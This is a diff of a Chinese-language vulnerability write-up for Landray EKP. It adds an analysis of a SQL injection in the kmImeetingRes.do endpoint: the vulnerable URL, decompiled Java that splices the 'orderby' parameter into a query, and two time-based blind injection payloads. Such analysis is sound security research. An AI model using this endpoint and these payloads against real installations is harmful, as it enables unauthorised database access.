@@ -190,9 +190,6 @@ filterInvocationInterceptor中也定义了一些匿名路径
 |kmImeetingRes.do sql注入漏洞|`/ekp/km/imeeting/km_imeeting_res/kmImeetingRes.do`|——|
 
 
-
-
-
 ### custom文件读取
 custom.jsp文件内容如下
 ```jsp
@@ -449,6 +446,44 @@ Java最简单的一句话木马如下，现在debug.jsp提供了木马两侧的�
 ```
 
 ### kmimeetingres_sql注入
+
+注入点为orderby，访问路径如下：
 ```
 /ekp/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true
+```
+在`KmssConfig/km/imeeting/spring-mvc.xml`查找KmImeetingRes.do的对应类为KmImeetingResAction，method为listUse，请求入口为KmImeetingResAction#listUse，实际的方法处理为`KmImeetingResServiceImp.class#listUse`，方法的大致内容如下（所以这个sql注入的前提是km_imeeting_main表中是需要有数据的）
+```java
+public Page listUse(RequestContext requestContext) throws Exception {
+    String s_pageno = requestContext.getParameter("pageno");
+    String s_rowsize = requestContext.getParameter("rowsize");
+    ...
+    int total = this.getListUseTotal(requestContext); // 先从km_imeeting_main表中查数据，这个sql没有输入点
+    if (total > 0) {
+        ...
+        SQLQuery sqlQuery = this.getUseSQLQuery(requestContext); // 执行sql
+    }
+}
+```
+在getUseSQLQuery方法中，sql的拼接省略如下。也就是sql命令`select something from order by xxx desc`。
+```java
+private SQLQuery getUseSQLQuery(RequestContext requestContext) {
+    String sql = "select * from ";
+    sql = sql + "select m.fd_id as fdId ... from km_imeeting_main where m.doc_creator_id=pa.fd_id union select b.fd_id as fdId from km_imeeting_book where b.doc_creator_id=pb.fd_id total";
+    String orderby = requestContext.getParameter("orderby");
+    String ordertype = requestContext.getParameter("ordertype");
+    if (ordertype != null && ordertype.equalsIgnoreCase("down")) {
+        orderby = orderby + " desc";
+    }
+    if (StringUtil.isNotNull(orderby)) {
+        sql = sql + " order by " + orderby;
+    } else {
+        sql = sql + " order by fdHoldDate desc";
+    }
+    SQLQuery sqlQuery = this.getBaseDao().getHibernateSession().createSQLQuery(sql);
+}
+```
+orderby参数注入的一些payliad
+```
+orderby=1 and (select 8320 from(select select(sleep(5)))JcSn)
+orderby=1;WAITFOR DELAY '0:0:5'--
 ```
